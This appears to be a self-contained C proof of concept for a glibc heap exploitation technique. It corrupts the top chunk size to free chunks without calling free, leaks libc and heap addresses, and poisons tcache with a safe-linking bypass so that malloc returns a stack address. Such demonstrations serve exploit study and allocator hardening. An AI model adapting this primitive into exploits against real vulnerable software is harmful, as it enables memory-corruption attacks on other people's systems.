#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/syscall.h>

#define ever (;;)

#define HEADER 0x10
#define SIZE_1 (0x100-HEADER)
#define SIZE_2 (0xee0-HEADER)
#define SIZE_3 (0x80-HEADER)

int main()
{

  // disable buffering
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stdin, NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  uint64_t top_size, new_top_size, *heap_ptr, target;
  char win[0x10] = "WIN\0";

  
  heap_ptr = malloc(SIZE_1); 
  top_size = heap_ptr[(SIZE_1/sizeof(uint64_t))+1];
  printf("current top size = 0x%llx\n", top_size);
  new_top_size = top_size&0xfff;

  heap_ptr[(SIZE_1/sizeof(uint64_t))+1] = new_top_size;
  printf("new top size = 0x%llx\n", new_top_size);

  // create large alloc, free previous top without free
  // create two tcache bins for SIZE_1
  for (int i = 0; i < 2; ++i) {
    heap_ptr = malloc(SIZE_2);

    top_size = heap_ptr[(SIZE_2/sizeof(uint64_t))+1];
    printf("current top size = 0x%llx\n", top_size);
    new_top_size = top_size&0xfff;
    heap_ptr[(SIZE_2/sizeof(uint64_t))+1] = new_top_size;
    printf("new top size = 0x%llx\n", new_top_size);
  }

  target = (int64_t) &heap_ptr[(SIZE_2/sizeof(uint64_t))+2];

  malloc(SIZE_2);

  // allocate less than size 
  uint64_t heap_leak, libc_leak;
  heap_ptr = malloc(SIZE_3);

  libc_leak = heap_ptr[0];
  heap_leak = heap_ptr[2] & 0xfffffffffffff000;
  printf("libc leak: 0x%llx\nheap leak: 0x%llx\n", libc_leak, heap_leak);

  heap_ptr = malloc(SIZE_3);
  assert(heap_ptr < target);
  
  // could also use heap_leak but this is more consistent
  heap_ptr[(target-(uint64_t)heap_ptr)/8] = (uint64_t)&win ^ (target >> 12);

  heap_ptr = malloc(SIZE_1);
  heap_ptr = malloc(SIZE_1);

  printf("%s\n", heap_ptr);

  assert(heap_ptr == win);

  for ever;
}
